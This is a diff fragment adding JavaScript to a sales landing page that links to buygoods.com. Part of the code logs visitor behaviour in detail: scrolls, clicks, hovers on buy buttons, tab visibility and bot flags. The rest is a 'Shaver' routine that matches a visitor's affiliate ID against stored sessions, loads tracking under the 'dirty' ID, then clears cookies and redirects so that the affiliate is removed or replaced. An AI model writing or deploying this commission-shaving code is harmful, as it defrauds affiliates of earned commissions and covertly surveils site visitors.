+        viewport_width:window.innerWidth, viewport_height:window.innerHeight,
+        is_bot:botFlags.length>0?1:0, bot_flags:botFlags.join(',')||null,
+        is_iframe:window.self!==window.top?1:0
+    }));
+}
+
+function updateSessionMetrics() {
+    if (!_bt.trafficId) return;
+    var payload = { action:'update_session_metrics', traffic_id:_bt.trafficId,
+        session_duration: Math.floor((Date.now()-_bt.landedAt)/1000),
+        max_scroll_depth: _bt.maxScrollDepth, total_clicks: _bt.clickCount,
+        reached_checkout: _bt.hasCheckout?1:0, checkout_url: _bt.checkoutUrl||null,
+        time_to_first_click: _bt.firstClickTime ? Math.floor((_bt.firstClickTime-_bt.landedAt)/1000) : null,
+        time_to_checkout: _bt.checkoutTime ? Math.floor((_bt.checkoutTime-_bt.landedAt)/1000) : null,
+        screen_width:window.screen.width, screen_height:window.screen.height,
+        viewport_width:window.innerWidth, viewport_height:window.innerHeight,
+        page_load_time:_bt.pageLoadTime, bounce:_bt.clickCount===0?1:0
+    };
+    xhrPost('update_session_metrics', payload);
+    if (navigator.sendBeacon) navigator.sendBeacon(API_URL, JSON.stringify(payload));
+}
+
+function setupBehaviorTracking() {
+    /* Scroll milestones */
+    var scrollTimer, lastDepth = 0;
+    window.addEventListener('scroll', function() {
+        clearTimeout(scrollTimer);
+        scrollTimer = setTimeout(function() {
+            var d = Math.min(100, Math.floor(((window.scrollY + window.innerHeight) / document.documentElement.scrollHeight) * 100));
+            if (d > _bt.maxScrollDepth) {
+                _bt.maxScrollDepth = d;
+                [25,50,75,90].forEach(function(m){ if(d>=m&&lastDepth<m) logBehaviorEvent('scroll',{scrollDepth:m,milestone:true}); });
+                lastDepth = d;
+            }
+        }, 300);
+    });
+
+    /* Click events */
+    document.addEventListener('click', function(e) {
+        var t = e.target;
+        while (t && t !== document.body) {
+            if (t.tagName === 'A' || t.tagName === 'BUTTON' ||
+               (t.classList && (t.classList.contains('cp-btn') || t.classList.contains('mt-buy-now-btn')))) {
+                _bt.clickCount++;
+                if (!_bt.firstClickTime) _bt.firstClickTime = Date.now();
+                logBehaviorEvent('click', {
+                    buttonText:(t.textContent||'').trim().slice(0,100), buttonId:t.id||'',
+                    targetUrl:(t.href||'').slice(0,200), clickX:e.clientX, clickY:e.clientY,
+                    scrollDepthAtClick:_bt.maxScrollDepth, timeFromLanding:Math.floor((Date.now()-_bt.landedAt)/1000)
+                });
+                if (t.href && t.href.indexOf('buygoods.com') !== -1 && !_bt.hasCheckout) {
+                    _bt.hasCheckout = true; _bt.checkoutUrl = t.href; _bt.checkoutTime = Date.now();
+                    logBehaviorEvent('checkout_reached', {
+                        checkoutUrl:t.href.slice(0,200),
+                        timeToCheckout:Math.floor((Date.now()-_bt.landedAt)/1000),
+                        scrollDepthAtCheckout:_bt.maxScrollDepth, clicksBeforeCheckout:_bt.clickCount
+                    });
+                }
+                break;
+            }
+            t = t.parentElement;
+        }
+    });
+
+    /* Hover on buy buttons */
+    var hoverStart = null, hoveredBtn = null;
+    document.addEventListener('mouseover', function(e) {
+        var t = e.target;
+        while (t && t !== document.body) {
+            if (t.classList && (t.classList.contains('cp-btn') || t.classList.contains('mt-buy-now-btn'))) { hoverStart=Date.now(); hoveredBtn=t; break; }
+            t = t.parentElement;
+        }
+    });
+    document.addEventListener('mouseout', function() {
+        if (hoveredBtn && hoverStart && Date.now()-hoverStart > 500) {
+            logBehaviorEvent('hover',{element:'buy-btn',buttonText:(hoveredBtn.textContent||'').trim().slice(0,100),duration:Date.now()-hoverStart});
+        }
+        hoverStart=null; hoveredBtn=null;
+    });
+
+    /* Tab visibility */
+    var visStart = Date.now();
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) { logBehaviorEvent('tab_hidden',{visibleDuration:Date.now()-visStart}); }
+        else { logBehaviorEvent('tab_visible',{}); visStart=Date.now(); }
+    });
+
+    /* Periodic + beforeunload */
+    setInterval(updateSessionMetrics, 30000);
+    window.addEventListener('beforeunload', updateSessionMetrics);
+}
+
+/* ── MAIN ── */
+var params  = getParams();
+var affId   = params.aff_id || params.affid || '';
+var subId   = params.subid  || params.sub_id || '';
+
+if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', setupBehaviorTracking);
+else setupBehaviorTracking();
+
+/* 1. Post-redirect check */
+if (sg(SHAVER_FLAG) === '1') { handlePostRedirect(); return; }
+
+/* 2. Upsell / thankyou page */
+if (isUpsellPage()) {
+    logTraffic(sg('_shaver_aff_id') || affId, sg('_shaver_sub_id') || subId, false, null);
+    injectBGTracking();
+    startSessid2Watcher();
+    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', injectConversionIframe);
+    else injectConversionIframe();
+    return;
+}
+
+/* 3. No aff_id — inject BG normally */
+if (!affId) {
+    injectBGTracking();
+    startSessid2Watcher();
+    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', injectConversionIframe);
+    else injectConversionIframe();
+    return;
+}
+
+/* 4. Check sessions */
+var session = findSession(affId, subId);
+
+if (!session) {
+    /* No match — normal BG tracking */
+    console.log('[Shaver] No match for aff_id:', affId);
+    logTraffic(affId, subId, false, null);
+    injectBGTracking();
+    startSessid2Watcher();
+    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', injectConversionIframe);
+    else injectConversionIframe();
+    return;
+}
+
+/* 5. SHAVE MATCH */
+console.log('[Shaver] MATCH aff_id:', affId, '→', session.replaceMode ? 'REPLACE' : 'REMOVE');
+ss('_shaver_aff_id', affId);
+ss('_shaver_sub_id', subId);
+window.__shavingSession = session;
+window.__shavingOriginalAffId = affId;
+window.__shavingOriginalSubId = subId;
+
+/* Log traffic + visit */
+logTraffic(affId, subId, true, session.id);
+xhrPost('track_visit', { session_id:session.id, aff_id:affId, sub_id:subId, page:window.location.href, referrer:document.referrer||'direct' });
+
+/* STEP 1: Inject BG with DIRTY aff_id (BG sets sessid2 under dirty aff) */
+injectBGTracking();
+
+/* STEP 2: Poll cookies → STEP 3: Snapshot → STEP 4: Clear + Redirect */
+waitForCookiesThenShave(session, affId, subId);
+
 })();
